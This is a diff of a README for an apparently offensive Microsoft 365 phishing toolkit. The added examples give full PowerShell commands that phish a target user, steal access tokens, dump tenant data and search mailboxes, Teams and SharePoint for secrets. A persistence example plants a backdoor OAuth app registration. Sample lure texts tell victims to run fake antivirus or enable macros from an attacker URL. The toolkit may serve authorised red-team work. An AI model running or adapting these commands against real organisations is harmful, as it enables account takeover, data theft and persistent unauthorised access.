@@ -26,6 +26,9 @@ WARNING: When you get your first bite, SAVE THAT TOKEN LOG. Get the users tokens
 .\ClearLoot.ps1
 ```
 
+### Modules
+It's modular, azurehound is one, AADInternals recon, AzureAD enumeration, etc. Recon.ps1, azuread.ps1, azurehound.ps1 are standalones that take access tokens or whatever params needed to do the thing. You can easily rip these out and use them in your own madness, if you want. I tried to make things as flexible as possible. Once you've mapped the tenant, performed recon and built your new lists you may as well as just use it for additional phishing and omit those switches. 
+
 ### Examples
 
 #### Install requirements, perform all recon using azuread, AADInternals, and Azurehound modules, attempt to use payroll account to phish a particular accountant
@@ -63,8 +66,33 @@ $template = "chatgpt"
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template
 ```
 
-### Modules
-It's modular, azurehound is one, AADInternals recon, AzureAD enumeration, etc. Recon.ps1, azuread.ps1, azurehound.ps1 are standalones that take access tokens or whatever params needed to do the thing. You can easily rip these out and use them in your own madness, if you want. I tried to make things as flexible as possible. Once you've mapped the tenant, performed recon and built your new lists you may as well as just use it for additional phishing and omit those switches. 
+#### GraphRecon
+Import GraphRunner, convert the tokens and run Invoke-GraphRunner to dump tenant info and search users mailbox, Teams and Sharepoint for defualt_detectors.json values
+
+```powershell
+$targetUser = "p.atreides@duneman.com"
+$firstUser = "chani@gmail.com"
+$messageContent = "At night fall, the spice harvesters land. The outsiders race against time to avoid the heat of the day. They ravage our land in front of our eyes. Their cruelty to my people is all I've known. These outsiders, the Harkonnens, came long before I was born. By controlling spice production, they became obscenely rich. Richer than the Emperor himself. Your computer is infected. Please download and run this anti-virus program to secure your PC https://virustime.azurewebsites.net"
+$subject = "Change Order Requested: Arrakis Square"
+$template = "bbb"
+
+.\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -install -GraphRecon
+```
+
+
+#### Persistence
+Inject an OAuth App Registration and capture the credentials. Uses the GraphRunner Invoke-InjectOAuthApp function and supports Invoke-AutoOAuthFlow to complete the Consent Grant flow and assign permissions to the App. This URL cna also be used for Consent Grant phishing and all the information you need is in the PeristenceApps.log file. 
+
+```powershell
+$targetUser = "p.atreides@duneman.com"
+$firstUser = "chani@gmail.com"
+$messageContent = " This crysknife was given to me by my great aunt. Its made from a tooth of Shai Hulud, the great sandworm. This will be a great honor for you to die holding it. Please click here and enable macros when prompted https://virustime.azurewebsites.net"
+$subject = "Urgent!!!"
+$template = "fondo"
+
+.\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -install -persistence -ReplyUrl "http://localhost:10000" -AppName "Spiceworks kekeke" -Scope "op backdoor"
+```
+
 
 ### Templates
 Adding a template to this is really easy. Look at the ones here and Replace.ps1, you can see we're looking for and replacing '(((VERIFICATION)))' in the html body. This is the device code that gets generated. If you place one in a new template and add a couple lines of code to Replace.ps1 and Next.ps1 you can use your own.
